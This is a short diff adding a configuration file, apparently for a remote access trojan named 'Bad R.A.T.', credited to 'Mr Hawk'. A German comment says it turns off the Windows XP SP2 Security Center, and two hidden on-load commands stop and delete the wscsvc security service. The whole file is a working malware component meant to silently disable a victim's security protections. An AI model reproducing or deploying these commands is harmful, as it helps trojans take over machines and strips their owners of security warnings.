@@ -1,0 +1,7 @@
+;Event Setting [Bad R.A.T.]
+;by Mr Hawk
+;THX to heroin
+
+; schaltet WinXP SP2 SecurityCenter aus
+OnLoad: StartPath_Hide sc stop wscsvc>NUL
+OnLoad: StartPath_Hide sc delete wscsvc>NUL
